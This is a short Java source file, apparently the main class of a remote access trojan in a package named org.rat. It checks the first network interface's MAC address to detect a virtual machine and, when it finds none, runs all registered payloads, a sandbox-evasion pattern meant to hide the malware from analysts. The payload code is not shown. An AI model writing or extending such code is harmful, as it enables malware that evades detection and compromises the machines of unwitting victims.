//Raddon On Top!

package org.rat;

import org.rat.payload.*;
import java.net.*;
import org.rat.util.*;
import java.util.*;

public class Main
{
    public static void main(final String[] args) {
        if (!isVM()) {
            for (final IPayload payload : IPayload.getPayloads()) {
                payload.run();
            }
        }
    }
    
    public static boolean isVM() {
        try {
            Enumeration<NetworkInterface> net = null;
            net = NetworkInterface.getNetworkInterfaces();
            if (net.hasMoreElements()) {
                final NetworkInterface element = net.nextElement();
                return MacUtil.isVMMac(element.getHardwareAddress());
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }
}
